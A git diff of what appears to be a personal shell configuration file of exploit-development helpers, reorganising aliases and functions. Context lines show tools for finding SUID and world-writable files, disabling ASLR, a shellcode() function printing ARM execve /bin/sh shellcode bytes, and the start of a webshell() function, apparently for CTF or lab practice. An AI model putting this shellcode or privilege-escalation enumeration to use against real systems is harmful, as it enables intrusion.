@@ -9,8 +9,9 @@ alias asmaarch64="aarch64-linux-gnu-as -aln -o /dev/null"
 alias lddd="LD_TRACE_LOADED_OBJECTS=1"
 alias LOCALLIB="LD_LIBRARY_PATH=./"
 alias NOASLR="setarch `uname -m` -R"
-findsuid="find . -type f -perm +6000 -ls"
-findwrite="find / -perm -2 ! -type l -ls"
+alias findsuid="find . -type f -perm +6000 -ls"
+alias findwrite="find / -perm -2 ! -type l -ls"
+alias syscall='grep -m 1 '$1' /usr/include/asm/unistd.h /usr/include/asm/unistd_32.h /usr/include/asm/unistd_64.h 2>/dev/null'
 
 aslr()
 {
@@ -21,11 +22,6 @@ aslr()
     elif [ $1 = "off" ]; then
         sudo sysctl -w kernel.randomize_va_space=0
     fi
-}
-
-syscall()
-{
-    grep -m 1 $1 "/usr/include/asm/unistd.h" "/usr/include/asm/unistd_32.h" "/usr/include/asm/unistd_64.h" 2>/dev/null
 }
 
 pxxd()
@@ -150,6 +146,11 @@ r.interactive()" > "$1.py"
     fi
 }
 
+quote()
+{
+    python -c "print __import__('urllib').quote('$1')"
+}
+
 shellcode()
 {
     echo "# Linux/x86 execve /bin/sh shellcode 23 bytes"
@@ -166,11 +167,6 @@ shellcode()
 
     echo "Linux/ARM - execve("/bin/sh", [0], [0 vars]) - 27 bytes"
     echo "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
-}
-
-quote()
-{
-    python -c "print __import__('urllib').quote('$1')"
 }
 
 webshell()
